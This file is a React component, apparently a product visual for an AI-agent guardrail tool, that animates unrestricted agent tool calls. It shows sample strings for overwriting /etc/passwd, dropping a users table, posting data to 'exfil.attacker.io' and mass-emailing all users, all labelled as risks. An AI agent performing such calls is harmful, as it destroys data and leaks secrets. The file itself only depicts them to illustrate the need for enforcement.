"use client";

import { motion } from "framer-motion";

const CALLS = [
  { id: 1, fn: "write_file('/etc/passwd')", risk: "CRITICAL", color: "#ef4444", delay: 0 },
  { id: 2, fn: "execute_sql('DROP TABLE users')", risk: "CRITICAL", color: "#ef4444", delay: 1.8 },
  { id: 3, fn: "http_post('exfil.attacker.io')", risk: "HIGH", color: "#f97316", delay: 3.6 },
  { id: 4, fn: "send_email(all_users=true)", risk: "HIGH", color: "#f97316", delay: 5.4 },
];

const LOOP = 9;

function PacketRow({ call }: { call: (typeof CALLS)[0] }) {
  const dur = 2.4;
  const rd = LOOP - dur;

  return (
    <div className="relative flex items-center h-10 select-none">
      <div className="w-14 shrink-0 flex items-center justify-end gap-1.5 pr-2">
        <motion.div
          className="w-1.5 h-1.5 rounded-full"
          style={{ backgroundColor: call.color }}
          animate={{ opacity: [0.3, 1, 0.3], scale: [0.8, 1.2, 0.8] }}
          transition={{ duration: 2, delay: call.delay % 2.1, repeat: Infinity }}
        />
        <span className="text-[10px] text-slate-600">agent</span>
      </div>

      <div className="relative flex-1 overflow-hidden h-full flex items-center">
        <div className="absolute inset-x-0 top-1/2 -translate-y-1/2 h-px bg-slate-800/50" />

        <motion.div
          className="absolute top-1/2 -translate-y-1/2 whitespace-nowrap"
          animate={{
            left: ["-5%", "107%"],
            opacity: [0, 1, 1, 0],
          }}
          transition={{
            left: {
              duration: dur,
              delay: call.delay,
              repeat: Infinity,
              repeatDelay: rd,
              ease: "easeInOut",
            },
            opacity: {
              duration: dur,
              delay: call.delay,
              repeat: Infinity,
              repeatDelay: rd,
              times: [0, 0.05, 0.91, 1],
            },
          }}
        >
          <div
            className="flex items-center gap-1.5 px-2.5 py-1 border text-[10px] font-mono"
            style={{
              borderColor: call.color + "55",
              backgroundColor: call.color + "15",
              color: call.color,
            }}
          >
            <div
              className="w-1 h-1 rounded-full shrink-0"
              style={{ backgroundColor: call.color }}
            />
            {call.fn}
          </div>
        </motion.div>
      </div>

      <div className="w-16 shrink-0 flex items-center pl-2 overflow-hidden">
        <motion.div
          className="px-1.5 py-0.5 border whitespace-nowrap"
          style={{
            color: call.color,
            borderColor: call.color + "50",
            backgroundColor: call.color + "15",
          }}
          animate={{ opacity: [0, 1, 1, 0] }}
          transition={{
            duration: 1.0,
            delay: call.delay + dur - 0.15,
            repeat: Infinity,
            repeatDelay: LOOP - 1.0,
          }}
        >
          <span className="text-[10px] font-bold font-mono">EXEC</span>
        </motion.div>
      </div>
    </div>
  );
}

export function DiscoverVisual() {
  return (
    <div className="relative w-full h-full bg-slate-950 overflow-hidden font-mono flex flex-col">
      <div
        className="absolute inset-0 opacity-[0.035]"
        style={{
          backgroundImage:
            "linear-gradient(rgba(255,255,255,0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.1) 1px, transparent 1px)",
          backgroundSize: "36px 36px",
        }}
      />
      <div
        className="absolute inset-0 pointer-events-none"
        style={{
          background:
            "radial-gradient(ellipse at center, transparent 45%, rgba(239,68,68,0.07) 100%)",
        }}
      />

      <div className="relative flex items-center justify-between px-4 py-2.5 border-b border-slate-800/50 bg-slate-900/50 shrink-0">
        <div className="flex items-center gap-2">
          <motion.div
            className="w-2 h-2 rounded-full bg-red-500"
            animate={{ opacity: [1, 0.2, 1] }}
            transition={{ duration: 1.3, repeat: Infinity }}
          />
          <span className="text-xs text-slate-300 tracking-wide">
            AGENT RUNTIME · NO ENFORCEMENT LAYER
          </span>
        </div>
        <motion.span
          className="text-[11px] font-bold tracking-widest text-red-400"
          animate={{ opacity: [0.7, 1, 0.7] }}
          transition={{ duration: 2.1, repeat: Infinity }}
        >
          UNPROTECTED
        </motion.span>
      </div>

      <div className="relative px-4 pt-3 pb-1 shrink-0">
        <span className="text-[11px] text-slate-600">
          Every tool call executes without restriction:
        </span>
      </div>

      <div className="relative flex-1 px-3 flex flex-col justify-center gap-1 py-2">
        {CALLS.map((call) => (
          <PacketRow key={call.id} call={call} />
        ))}
      </div>

      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.5 }}
        className="relative mx-4 mb-3 px-3 py-2 border border-red-500/20 bg-red-500/[0.05] flex items-center justify-between shrink-0"
      >
        <span className="text-[11px] text-red-400/80">
          No policy enforced · 0 actions blocked
        </span>
        <span className="text-[11px] font-bold text-red-500/80">
          4 tools exposed
        </span>
      </motion.div>
    </div>
  );
}
